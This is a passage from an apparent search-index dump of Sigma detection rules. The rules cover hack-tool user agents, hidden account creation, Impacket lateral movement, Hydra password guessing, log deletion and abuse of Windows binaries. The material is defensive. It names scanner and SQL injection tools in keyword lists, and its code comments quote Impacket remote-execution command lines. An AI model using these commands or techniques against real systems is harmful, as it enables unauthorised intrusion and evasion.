of selection* falsepositives: - Legitimate administration tools and activities level: low tags: - attack.credential_access - attack.t1056.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_gui_input_capture.yml/","tags":["attack.credential_access","attack.t1056.002"],"title":"GUI Input Capture - macOS"},{"categories":null,"contents":"Detects suspicious user agent strings user by hack tools in proxy logs\nKnown false-positives Unknown References https://github.com/fastly/waf_testbed/blob/master/templates/default/scanners-user-agents.data.erb http://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules Raw rule (edit) title: Hack Tool User Agent id: c42a3073-30fb-48ae-8c99-c23ada84b103 status: test description: Detects suspicious user agent strings user by hack tools in proxy logs author: Florian Roth references: - https://github.com/fastly/waf_testbed/blob/master/templates/default/scanners-user-agents.data.erb - http://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules date: 2017/07/08 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent|contains: # Vulnerability scanner and brute force tools - \u0026#39;(hydra)\u0026#39; - \u0026#39; arachni/\u0026#39; - \u0026#39; BFAC \u0026#39; - \u0026#39; brutus \u0026#39; - \u0026#39; cgichk \u0026#39; - \u0026#39;core-project/1.0\u0026#39; - \u0026#39; crimscanner/\u0026#39; - \u0026#39;datacha0s\u0026#39; - \u0026#39;dirbuster\u0026#39; - \u0026#39;domino hunter\u0026#39; - \u0026#39;dotdotpwn\u0026#39; - \u0026#39;FHScan Core\u0026#39; - \u0026#39;floodgate\u0026#39; - \u0026#39;get-minimal\u0026#39; - \u0026#39;gootkit auto-rooter scanner\u0026#39; - \u0026#39;grendel-scan\u0026#39; - \u0026#39; inspath \u0026#39; - \u0026#39;internet ninja\u0026#39; - \u0026#39;jaascois\u0026#39; - \u0026#39; zmeu \u0026#39; - \u0026#39;masscan\u0026#39; - \u0026#39; metis \u0026#39; - \u0026#39;morfeus fucking scanner\u0026#39; - \u0026#39;n-stealth\u0026#39; - \u0026#39;nsauditor\u0026#39; - \u0026#39;pmafind\u0026#39; - \u0026#39;security scan\u0026#39; - \u0026#39;springenwerk\u0026#39; - \u0026#39;teh forest lobster\u0026#39; - \u0026#39;toata dragostea\u0026#39; - \u0026#39; vega/\u0026#39; - \u0026#39;voideye\u0026#39; - \u0026#39;webshag\u0026#39; - \u0026#39;webvulnscan\u0026#39; - \u0026#39; whcc/\u0026#39; # SQL Injection - \u0026#39; Havij\u0026#39; - \u0026#39;absinthe\u0026#39; - \u0026#39;bsqlbf\u0026#39; - \u0026#39;mysqloit\u0026#39; - \u0026#39;pangolin\u0026#39; - \u0026#39;sql power injector\u0026#39; - \u0026#39;sqlmap\u0026#39; - \u0026#39;sqlninja\u0026#39; - \u0026#39;uil2pn\u0026#39; # Hack tool - \u0026#39;ruler\u0026#39; # https://www.crowdstrike.com/blog/using-outlook-forms-lateral-movement-persistence/ - \u0026#39;Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)\u0026#39; # SQLi Dumper condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 - attack.credential_access - attack.t1110 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ua_hacktool.yml/","tags":["attack.initial_access","attack.t1190","attack.credential_access","attack.t1110"],"title":"Hack Tool User Agent"},{"categories":null,"contents":"Detects the creation of a local hidden user account which should not happen for event ID 4720.\nKnown false-positives unknown References https://twitter.com/SBousseaden/status/1387743867663958021 Raw rule (edit) title: Hidden Local User Creation id: 7b449a5e-1db5-4dd0-a2dc-4e3a67282538 description: Detects the creation of a local hidden user account which should not happen for event ID 4720. status: experimental tags: - attack.persistence - attack.t1136.001 references: - https://twitter.com/SBousseaden/status/1387743867663958021 author: Christian Burkard date: 2021/05/03 logsource: product: windows service: security detection: selection: EventID: 4720 TargetUserName|endswith: \u0026#39;$\u0026#39; condition: selection fields: - EventCode - AccountName falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_hidden_user_creation.yml/","tags":["attack.persistence","attack.t1136.001"],"title":"Hidden Local User Creation"},{"categories":null,"contents":"Detects events that appear when a user click on a link file with a powershell command in it\nKnown false-positives Legitimate commands in .lnk files References https://www.x86matthew.com/view_post?id=embed_exe_lnk Raw rule (edit) title: Hidden Powershell in Link File Pattern id: 30e92f50-bb5a-4884-98b5-d20aa80f3d7a status: experimental description: Detects events that appear when a user click on a link file with a powershell command in it author: frack113 date: 2022/02/06 references: - https://www.x86matthew.com/view_post?id=embed_exe_lnk logsource: category: process_creation product: windows detection: selection: ParentImage: C:\\Windows\\explorer.exe Image: C:\\Windows\\System32\\cmd.exe CommandLine|contains|all: - \u0026#39;powershell\u0026#39; - \u0026#39;.lnk\u0026#39; condition: selection falsepositives: - Legitimate commands in .lnk files level: medium tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_embed_exe_lnk.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Hidden Powershell in Link File Pattern"},{"categories":null,"contents":"Detects creation of a hidden user account on macOS (UserID \u0026lt; 500) or with IsHidden option\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.002/T1564.002.md Raw rule (edit) title: Hidden User Creation id: b22a5b36-2431-493a-8be1-0bae56c28ef3 status: test description: Detects creation of a hidden user account on macOS (UserID \u0026lt; 500) or with IsHidden option author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.002/T1564.002.md date: 2020/10/10 modified: 2021/11/27 logsource: category: process_creation product: macos detection: dscl_create: Image|endswith: \u0026#39;/dscl\u0026#39; CommandLine|contains: \u0026#39;create\u0026#39; id_below_500: CommandLine|contains: UniqueID CommandLine|re: \u0026#39;([0-9]|[1-9][0-9]|[1-4][0-9]{2})\u0026#39; ishidden_option_declaration: CommandLine|contains: \u0026#39;IsHidden\u0026#39; ishidden_option_confirmation: CommandLine|contains: - \u0026#39;true\u0026#39; - \u0026#39;yes\u0026#39; - \u0026#39;1\u0026#39; condition: dscl_create and id_below_500 or dscl_create and (ishidden_option_declaration and ishidden_option_confirmation) falsepositives: - Legitimate administration activities level: medium tags: - attack.defense_evasion - attack.t1564.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_create_hidden_account.yml/","tags":["attack.defense_evasion","attack.t1564.002"],"title":"Hidden User Creation"},{"categories":null,"contents":"A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.\nKnown false-positives unknown References https://github.com/OTRF/detection-hackathon-apt29/issues/6 https://threathunterplaybook.com/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.html Raw rule (edit) title: High Integrity Sdclt Process id: 40f9af16-589d-4984-b78d-8c2aec023197 status: test description: A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/6 - https://threathunterplaybook.com/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.html date: 2020/05/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;sdclt.exe\u0026#39; IntegrityLevel: \u0026#39;High\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_high_integrity_sdclt.yml/","tags":["attack.privilege_escalation","attack.defense_evasion","attack.t1548.002"],"title":"High Integrity Sdclt Process"},{"categories":null,"contents":"Detects the usage of tsclient share to place a backdoor on the RDP source machine\u0026rsquo;s startup folder\nKnown false-positives unknown Raw rule (edit) title: Hijack Legit RDP Session to Move Laterally id: 52753ea4-b3a0-4365-910d-36cff487b789 status: test description: Detects the usage of tsclient share to place a backdoor on the RDP source machine\u0026#39;s startup folder author: Samir Bousseaden date: 2019/02/21 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: Image|endswith: \u0026#39;\\mstsc.exe\u0026#39; TargetFilename|contains: \u0026#39;\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.command_and_control - attack.t1219 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_tsclient_filewrite_startup.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"Hijack Legit RDP Session to Move Laterally"},{"categories":null,"contents":"Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)\nKnown false-positives unknown References https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/ Raw rule (edit) title: HTML Help Shell Spawn id: 52cad028-0ff0-4854-8f67-d25dfcbc78b4 status: test description: Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm) author: Maxim Pavlunin references: - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/ date: 2020/04/01 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage: \u0026#39;C:\\Windows\\hh.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1218.001 - attack.t1218.010 - attack.t1218.011 - attack.execution - attack.t1059.001 - attack.t1059.003 - attack.t1059.005 - attack.t1059.007 - attack.t1047 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_html_help_spawn.yml/","tags":["attack.defense_evasion","attack.t1218.001","attack.t1218.010","attack.t1218.011","attack.execution","attack.t1059.001","attack.t1059.003","attack.t1059.005","attack.t1059.007","attack.t1047"],"title":"HTML Help Shell Spawn"},{"categories":null,"contents":"Rule to detect the Hybrid Connection Manager service installation.\nKnown false-positives Legitimate use of Hybrid Connection Manager via Azure function apps. References https://twitter.com/Cyb3rWard0g/status/1381642789369286662 Raw rule (edit) title: HybridConnectionManager Service Installation id: 0ee4d8a5-4e67-4faf-acfa-62a78457d1f2 description: Rule to detect the Hybrid Connection Manager service installation. status: experimental date: 2021/04/12 modified: 2021/08/09 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.persistence - attack.t1554 references: - https://twitter.com/Cyb3rWard0g/status/1381642789369286662 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceName: HybridConnectionManager ServiceFileName|contains: HybridConnectionManager condition: selection falsepositives: - Legitimate use of Hybrid Connection Manager via Azure function apps. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_hybridconnectionmgr_svc_installation.yml/","tags":["attack.persistence","attack.t1554"],"title":"HybridConnectionManager Service Installation"},{"categories":null,"contents":"Detects the installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function.\nKnown false-positives Unknown References https://twitter.com/Cyb3rWard0g/status/1381642789369286662 Raw rule (edit) title: HybridConnectionManager Service Installation id: ac8866c7-ce44-46fd-8c17-b24acff96ca8 description: Detects the installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function. status: experimental date: 2021/04/12 modified: 2022/01/13 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.resource_development - attack.t1608 references: - https://twitter.com/Cyb3rWard0g/status/1381642789369286662 logsource: category: registry_event product: windows detection: selection1: TargetObject|contains: \u0026#39;\\Services\\HybridConnectionManager\u0026#39; selection2: EventType: SetValue Details|contains: \u0026#39;Microsoft.HybridConnectionManager.Listener.exe\u0026#39; condition: selection1 or selection2 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_hybridconnectionmgr_svc_installation.yml/","tags":["attack.resource_development","attack.t1608"],"title":"HybridConnectionManager Service Installation"},{"categories":null,"contents":"Rule to detect the Hybrid Connection Manager service running on an endpoint.\nKnown false-positives Legitimate use of Hybrid Connection Manager via Azure function apps. References https://twitter.com/Cyb3rWard0g/status/1381642789369286662 Raw rule (edit) title: HybridConnectionManager Service Running id: b55d23e5-6821-44ff-8a6e-67218891e49f description: Rule to detect the Hybrid Connection Manager service running on an endpoint. status: experimental date: 2021/04/12 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.persistence - attack.t1554 references: - https://twitter.com/Cyb3rWard0g/status/1381642789369286662 logsource: product: windows service: microsoft-servicebus-client detection: selection: EventID: - 40300 - 40301 - 40302 keywords: - \u0026#39;HybridConnection\u0026#39; - \u0026#39;sb://\u0026#39; - \u0026#39;servicebus.windows.net\u0026#39; - \u0026#39;HybridConnectionManage\u0026#39; condition: selection and keywords falsepositives: - Legitimate use of Hybrid Connection Manager via Azure function apps. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/servicebus/win_hybridconnectionmgr_svc_running.yml/","tags":["attack.persistence","attack.t1554"],"title":"HybridConnectionManager Service Running"},{"categories":null,"contents":"Detects command line parameters used by Hydra password guessing hack tool\nKnown false-positives Software that uses the caret encased keywords PASS and USER in its command line References https://github.com/vanhauser-thc/thc-hydra https://attack.mitre.org/techniques/T1110/001/ Raw rule (edit) title: Hydra Password Guessing Hack Tool id: aaafa146-074c-11eb-adc1-0242ac120002 status: test description: Detects command line parameters used by Hydra password guessing hack tool author: Vasiliy Burov references: - https://github.com/vanhauser-thc/thc-hydra - https://attack.mitre.org/techniques/T1110/001/ date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39;-u \u0026#39; - \u0026#39;-p \u0026#39; selection2: CommandLine|contains: - \u0026#39;^USER^\u0026#39; - \u0026#39;^PASS^\u0026#39; condition: selection1 and selection2 falsepositives: - Software that uses the caret encased keywords PASS and USER in its command line level: high tags: - attack.credential_access - attack.t1110 - attack.t1110.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hack_hydra.yml/","tags":["attack.credential_access","attack.t1110","attack.t1110.001"],"title":"Hydra Password Guessing Hack Tool"},{"categories":null,"contents":"Detects the image load of vss_ps.dll by uncommon executables using OriginalFileName datapoint\nKnown false-positives unknown References 1bd85e1caa1415ebdc8852c91e37bbb7 https://twitter.com/am0nsec/status/1412232114980982787 Raw rule (edit) title: Image Load of VSS_PS.dll by Uncommon Executable id: 333cdbe8-27bb-4246-bf82-b41a0dca4b70 status: experimental description: Detects the image load of vss_ps.dll by uncommon executables using OriginalFileName datapoint author: Markus Neis, @markus_neis date: 2021/07/07 modified: 2022/02/21 references: - 1bd85e1caa1415ebdc8852c91e37bbb7 - https://twitter.com/am0nsec/status/1412232114980982787 tags: - attack.defense_evasion - attack.impact - attack.t1490 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - \u0026#39;\\vss_ps.dll\u0026#39; filter: Image|endswith: - \u0026#39;\\svchost.exe\u0026#39; - \u0026#39;\\msiexec.exe\u0026#39; - \u0026#39;\\vssvc.exe\u0026#39; - \u0026#39;\\srtasks.exe\u0026#39; - \u0026#39;\\tiworker.exe\u0026#39; - \u0026#39;\\dllhost.exe\u0026#39; - \u0026#39;\\searchindexer.exe\u0026#39; - \u0026#39;dismhost.exe\u0026#39; - \u0026#39;taskhostw.exe\u0026#39; - \u0026#39;\\clussvc.exe\u0026#39; - \u0026#39;\\thor64.exe\u0026#39; - \u0026#39;\\thor.exe\u0026#39; Image|contains: \u0026#39;c:\\windows\\\u0026#39; condition: selection and not filter falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_suspicious_vss_ps_load.yml/","tags":["attack.defense_evasion","attack.impact","attack.t1490"],"title":"Image Load of VSS_PS.dll by Uncommon Executable"},{"categories":null,"contents":"Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework\nKnown false-positives pentesters References https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py Raw rule (edit) title: Impacket Lateralization Detection id: 10c14723-61c7-4c75-92ca-9af245723ad2 status: stable description: Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework author: Ecco, oscd.community, Jonhnathan Ribeiro references: - https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py - https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py - https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py - https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py date: 2019/09/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_other: # *** wmiexec.py # parent is wmiprvse.exe # examples: # cmd.exe /Q /c whoami 1\u0026gt; \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2\u0026gt;\u0026amp;1 # cmd.exe /Q /c cd 1\u0026gt; \\\\127.0.0.1\\ADMIN$\\__1567439113.54 2\u0026gt;\u0026amp;1 # *** dcomexec.py -object MMC20 # parent is mmc.exe # example: # \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /Q /c cd 1\u0026gt; \\\\127.0.0.1\\ADMIN$\\__1567442499.05 2\u0026gt;\u0026amp;1 # *** dcomexec.py -object ShellBrowserWindow # runs %SystemRoot%\\System32\\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c08afd90-f2a1-11d1-8455-00a0c91f3880} but parent command is explorer.exe # example: # \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /Q /c cd \\ 1\u0026gt; \\\\127.0.0.1\\ADMIN$\\__1567520103.71 2\u0026gt;\u0026amp;1 # *** smbexec.py # parent is services.exe # example: # C:\\Windows\\system32\\cmd.exe /Q /c echo tasklist ^\u0026gt; \\\\127.0.0.1\\C$\\__output 2^\u0026gt;^\u0026amp;1 \u0026gt; C:\\Windows\\TEMP\\execute.bat \u0026amp; C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat \u0026amp; del C:\\Windows\\TEMP\\execute.bat ParentImage|endswith: - \u0026#39;\\wmiprvse.exe\u0026#39; # wmiexec - \u0026#39;\\mmc.exe\u0026#39; # dcomexec MMC - \u0026#39;\\explorer.exe\u0026#39; # dcomexec ShellBrowserWindow - \u0026#39;\\services.exe\u0026#39; # smbexec CommandLine|contains|all: - \u0026#39;cmd.exe\u0026#39; - \u0026#39;/Q\u0026#39; - \u0026#39;/c\u0026#39; - \u0026#39;\\\\\\\\127.0.0.1\\\u0026#39; - \u0026#39;\u0026amp;1\u0026#39; selection_atexec: ParentCommandLine|contains: - \u0026#39;svchost.exe -k netsvcs\u0026#39; # atexec on win10 (parent is \u0026#34;C:\\Windows\\system32\\svchost.exe -k netsvcs\u0026#34;) - \u0026#39;taskeng.exe\u0026#39; # atexec on win7 (parent is \u0026#34;taskeng.exe {AFA79333-694C-4BEE-910E-E57D9A3518F6} S-1-5-18:NT AUTHORITY\\System:Service:\u0026#34;) # cmd.exe /C tasklist /m \u0026gt; C:\\Windows\\Temp\\bAJrYQtL.tmp 2\u0026gt;\u0026amp;1 CommandLine|contains|all: - \u0026#39;cmd.exe\u0026#39; - \u0026#39;/C\u0026#39; - \u0026#39;Windows\\Temp\\\u0026#39; - \u0026#39;\u0026amp;1\u0026#39; condition: (1 of selection_*) fields: - CommandLine - ParentCommandLine falsepositives: - pentesters level: critical tags: - attack.execution - attack.t1047 - attack.lateral_movement - attack.t1021.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_impacket_lateralization.yml/","tags":["attack.execution","attack.t1047","attack.lateral_movement","attack.t1021.003"],"title":"Impacket Lateralization Detection"},{"categories":null,"contents":"Detects the import of the specified file to the registry with regedit.exe.\nKnown false-positives Legitimate import of keys Evernote References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f Raw rule (edit) title: Imports Registry Key From a File id: 73bba97f-a82d-42ce-b315-9182e76c57b1 status: test description: Detects the import of the specified file to the registry with regedit.exe. author: Oddvar Moe, Sander Wiebing, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f date: 2020/10/07 modified: 2022/02/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regedit.exe\u0026#39; CommandLine|contains: - \u0026#39; /i \u0026#39; - \u0026#39; /s \u0026#39; - \u0026#39;.reg\u0026#39; filter: CommandLine|contains: - \u0026#39; /e \u0026#39; - \u0026#39; /a \u0026#39; - \u0026#39; /c \u0026#39; filter_2: CommandLine|re: \u0026#39;:[^ \\\\\\\\]\u0026#39; # to avoid intersection with ADS rule condition: selection and not filter and not filter_2 fields: - ParentImage - CommandLine falsepositives: - Legitimate import of keys - Evernote level: medium tags: - attack.t1112 - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml/","tags":["attack.t1112","attack.defense_evasion"],"title":"Imports Registry Key From a File"},{"categories":null,"contents":"Detects the import of a alternate datastream to the registry with regedit.exe.\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f Raw rule (edit) title: Imports Registry Key From an ADS id: 0b80ade5-6997-4b1d-99a1-71701778ea61 status: test description: Detects the import of a alternate datastream to the registry with regedit.exe. author: Oddvar Moe, Sander Wiebing, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regedit.exe\u0026#39; CommandLine|contains: - \u0026#39; /i \u0026#39; - \u0026#39;.reg\u0026#39; selection_2: CommandLine|re: \u0026#39;:[^ \\\\\\\\]\u0026#39; filter: CommandLine|contains: - \u0026#39; /e \u0026#39; - \u0026#39; /a \u0026#39; - \u0026#39; /c \u0026#39; condition: selection and selection_2 and not filter fields: - ParentImage - CommandLine falsepositives: - Unknown level: high tags: - attack.t1112 - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml/","tags":["attack.t1112","attack.defense_evasion"],"title":"Imports Registry Key From an ADS"},{"categories":null,"contents":"Detects deletion of local audit logs\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.002/T1070.002.md Raw rule (edit) title: Indicator Removal on Host - Clear Mac System Logs id: acf61bd8-d814-4272-81f0-a7a269aa69aa status: experimental description: Detects deletion of local audit logs author: remotephone, oscd.community date: 2020/10/11 modified: 2021/11/11 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.002/T1070.002.md logsource: product: macos category: process_creation detection: selection1: Image|endswith: \u0026#39;/rm\u0026#39; selection2: CommandLine|contains: \u0026#39;/var/log\u0026#39; selection3: CommandLine|contains|all: - \u0026#39;/Users/\u0026#39; - \u0026#39;/Library/Logs/\u0026#39; condition: selection1 and (selection2 or selection3) falsepositives: - Legitimate administration activities level: medium tags: - attack.defense_evasion - attack.t1070.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_clear_system_logs.yml/","tags":["attack.defense_evasion","attack.t1070.002"],"title":"Indicator Removal on Host - Clear Mac System Logs"},{"categories":null,"contents":"Detect indirect command execution via Program Compatibility Assistant pcwrun.exe\nKnown false-positives Need to use extra processing with \u0026lsquo;unique_count\u0026rsquo; / \u0026lsquo;filter\u0026rsquo; to focus on outliers as opposed to commonly seen artifacts Legit usage of scripts References https://twitter.com/pabraeken/status/991335019833708544 https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/ Raw rule (edit) title: Indirect Command Execution By Program Compatibility Wizard id: b97cd4b1-30b8-4a9d-bd72-6293928d52bc status: test description: Detect indirect command execution via Program Compatibility Assistant pcwrun.exe author: A. Sungurov , oscd.community references: - https://twitter.com/pabraeken/status/991335019833708544 - https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/ date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\pcwrun.exe\u0026#39; condition: selection fields: - ComputerName - User - ParentCommandLine - CommandLine falsepositives: - Need to use extra processing with \u0026#39;unique_count\u0026#39; / \u0026#39;filter\u0026#39; to focus on outliers as opposed to commonly seen artifacts - Legit usage of scripts level: low tags: - attack.defense_evasion - attack.t1218 - attack.execution ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_indirect_cmd_compatibility_assistant.yml/","tags":["attack.defense_evasion","attack.t1218","attack.execution"],"title":"Indirect Command Execution By Program Compatibility Wizard"},{"categories":null,"contents":"Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml Raw rule (edit) title: InfDefaultInstall.exe .inf Execution id: ce7cf472-6fcc-490a-9481-3786840b5d9b status: experimental author: frack113 date: 2021/07/13 description: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;InfDefaultInstall.exe \u0026#39; - \u0026#39;.inf\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_infdefaultinstall.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"InfDefaultInstall.exe .inf Execution"},{"categories":null,"contents":"Detects installed new certificate\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md Raw rule (edit) title: Install Root Certificate id: 78a80655-a51e-4669-bc6b-e9d206a462ee status: test description: Detects installed new certificate author: Ömer Günal, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md date: 2020/10/05 modified: 2021/11/27 logsource: product: linux category: process_creation detection: selection: Image|endswith: - \u0026#39;/update-ca-certificates\u0026#39; - \u0026#39;/update-ca-trust\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: low tags: - attack.defense_evasion - attack.t1553.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_install_root_certificate.yml/","tags":["attack.defense_evasion","attack.t1553.004"],"title":"Install Root Certificate"},{"categories":null,"contents":"Detects failed logins with multiple invalid domain accounts from a single source system using the NTLM protocol.\nKnown false-positives Terminal servers Jump servers Other multiuser systems like Citrix server farms Workstations with frequently changing users References https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying Raw rule (edit) title: Invalid Users Failing To Authenticate From Single Source Using NTLM id: 56d62ef8-3462-4890-9859-7b41e541f8d5 description: Detects failed logins with multiple invalid domain accounts from a single source system using the NTLM protocol. status: experimental author: Mauricio Velazco date: 2021/06/01 modified: 2021/07/07 references: - https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4776 Status: \u0026#39;*0xC0000064\u0026#39; # The username you typed does not exist. Bad username. filter: TargetUserName: \u0026#39;*$\u0026#39; timeframe: 24h condition: - selection1 and not filter | count(TargetUserName) by Workstation \u0026gt; 10 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logons_single_source_ntlm2.yml/","tags":["attack.t1110.003","attack.initial_access","attack.privilege_escalation"],"title":"Invalid Users Failing To Authenticate From Single Source Using NTLM"},{"categories":null,"contents":"Detects failed logins with multiple invalid domain accounts from a single source system using the Kerberos protocol.\nKnown false-positives Vulnerability scanners Misconfigured systems Remote administration tools VPN terminators Multiuser systems like Citrix server farms References https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying Raw rule (edit) title: Invalid Users Failing To Authenticate From Source Using Kerberos id: bc93dfe6-8242-411e-a2dd-d16fa0cc8564 description: Detects failed 